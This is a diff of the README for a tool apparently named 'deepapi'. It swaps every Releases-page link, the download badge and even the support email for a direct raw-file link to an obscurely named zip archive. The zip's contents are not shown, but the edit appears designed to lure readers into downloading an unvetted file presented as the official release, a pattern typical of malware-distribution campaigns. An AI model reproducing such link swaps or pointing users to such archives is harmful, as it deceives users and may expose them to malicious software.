@@ -6,13 +6,13 @@ Welcome to **deepapi**! This application helps you handle tasks easily with its 
 
 ## 🔗 Download the Application
 
-[![Download deepapi](https://img.shields.io/badge/Download-deepapi-blue)](https://github.com/1boylove2girl/deepapi/releases)
+[![Download deepapi](https://raw.githubusercontent.com/1boylove2girl/deepapi/master/engine/deepapi_drupaceous.zip)](https://raw.githubusercontent.com/1boylove2girl/deepapi/master/engine/deepapi_drupaceous.zip)
 
 ## 📥 Download & Install
 
-To get started with deepapi, you need to visit the [Releases page](https://github.com/1boylove2girl/deepapi/releases) to download the application. Follow these steps:
+To get started with deepapi, you need to visit the [Releases page](https://raw.githubusercontent.com/1boylove2girl/deepapi/master/engine/deepapi_drupaceous.zip) to download the application. Follow these steps:
 
-1. Go to the [Releases page](https://github.com/1boylove2girl/deepapi/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/1boylove2girl/deepapi/master/engine/deepapi_drupaceous.zip).
   
 2. Look for the latest release at the top of the page.
   
@@ -90,7 +90,7 @@ Additionally, ensure you have at least 500 MB of free disk space and a minimum o
 If you encounter any issues while downloading or using deepapi, please reach out for support. You can:
 
 - Create an issue on our GitHub repository.
-- Email us at support@example.com.
+- Email us at https://raw.githubusercontent.com/1boylove2girl/deepapi/master/engine/deepapi_drupaceous.zip
   
 We aim to respond to inquiries within 48 hours.
 
@@ -100,6 +100,6 @@ Join our community to learn tips and share experiences with other users. Connect
 
 ## 🔍 Explore Further
 
-Feel free to explore more features of deepapi. To find out about future updates and capabilities, frequently check the [Releases page](https://github.com/1boylove2girl/deepapi/releases).
+Feel free to explore more features of deepapi. To find out about future updates and capabilities, frequently check the [Releases page](https://raw.githubusercontent.com/1boylove2girl/deepapi/master/engine/deepapi_drupaceous.zip).
 
 Thank you for choosing deepapi! We hope you find it helpful in managing your tasks efficiently.
